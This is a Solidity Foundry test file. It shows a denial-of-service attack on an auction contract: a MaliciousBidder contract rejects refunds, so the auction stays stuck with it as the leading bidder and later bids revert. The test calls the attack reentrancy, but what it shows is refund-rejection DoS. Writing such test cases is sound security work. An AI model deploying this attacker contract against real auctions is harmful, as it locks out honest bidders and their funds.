// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/auction.sol";

contract MaliciousBidder {
    DosAuction public auction;

    constructor(DosAuction _auction) payable {
        auction = _auction;
    }

    // Malicious contract that reverts when receiving refunds
    receive() external payable {
        revert("DoS attack - refund rejected");
    }

    function bid(uint256 amount) external payable {
        auction.bid{value: amount}();
    }
}

contract DosAuctionTest is Test {
    DosAuction public auction;
    MaliciousBidder public attacker;

    address public owner = makeAddr("owner");
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");

    function setUp() public {
        vm.startPrank(owner);
        auction = new DosAuction();
        auction.startAuction(7 days);
        vm.stopPrank();

        // Fund users
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
    }

    function test_ReentrancyDos() public {
        // 1. Place initial legitimate bid
        vm.prank(alice);
        auction.bid{value: 1 ether}();
        assertEq(auction.currentBid(), 1 ether);

        // 2. Attacker places bid (with sufficient funds)
        attacker = new MaliciousBidder{value: 1.5 ether}(auction);
        attacker.bid(1.5 ether);

        // Verify attacker becomes new frontrunner
        assertEq(auction.currentFrontrunner(), address(attacker));
        assertEq(auction.currentBid(), 1.5 ether);

        // 3. Bob attempts to place higher bid (should fail due to attacker's malicious receive function)
        vm.prank(bob);
        vm.expectRevert();
        auction.bid{value: 2 ether}();

        // Verify auction state remains stuck with attacker as frontrunner
        assertEq(auction.currentFrontrunner(), address(attacker));
        assertEq(auction.currentBid(), 1.5 ether);
    }

    function test_LegitimateBidAfterMalicious() public {
        // Setup the DoS scenario via attacker first
        test_ReentrancyDos();

        // 4. Carol attempts to bid after Bob - should also fail
        address carol = makeAddr("carol");
        vm.deal(carol, 10 ether);

        vm.prank(carol);
        vm.expectRevert();
        auction.bid{value: 3 ether}();
    }
}
